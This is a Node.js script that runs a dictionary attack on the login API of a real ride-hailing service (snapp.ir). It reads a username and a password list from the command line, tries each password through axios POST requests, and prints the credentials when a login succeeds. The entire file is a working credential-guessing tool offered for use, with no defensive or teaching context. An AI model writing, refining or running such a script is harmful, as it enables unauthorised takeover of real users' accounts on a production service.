const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { Spinner } = require('clui');
const Promise = require('bluebird');

const API_URL = 'https://web-api.snapp.ir/api/v1/auth/login';
const START_TIME = Date.now();
Promise.promisifyAll(fs);

const spinner = new Spinner('Please Wait...');
spinner.start();

async function login(username, password) {
  try {
    const response = await axios.post(API_URL, { username, password });
    return { status: true, user: { username, password } };
  } catch (err) {
    return { status: false };
  }
}

async function checkAuthStatus(username, password) {
  const response = await login(username, password);
  if (response.status === true) {
    spinner.stop();
    console.log('********************');
    console.log('Match Found!');
    console.log(response.user);
    console.log(`Time spent: ${Date.now() - START_TIME} ms`);
    console.log('********************');
    process.exit(0);
  } else { return }
}

function sendRequests(username, passwords) {
  return Promise.each(passwords, password => checkAuthStatus(username, password));
}

async function main() {
  const args = process.argv.slice(2);
  const username = args[0];
  const pwFilePath = path.resolve(args[1]);
  const pwFile = await fs.readFileAsync(pwFilePath, 'utf8');
  const passwords = pwFile.split('\n');
  const foo = await sendRequests(username, passwords);
  spinner.stop();
  console.log('********************')
  console.log('No match found');
  console.log(`Time spent: ${Date.now() - START_TIME} ms`);
  console.log('********************');
  process.exit(0);
}

main();
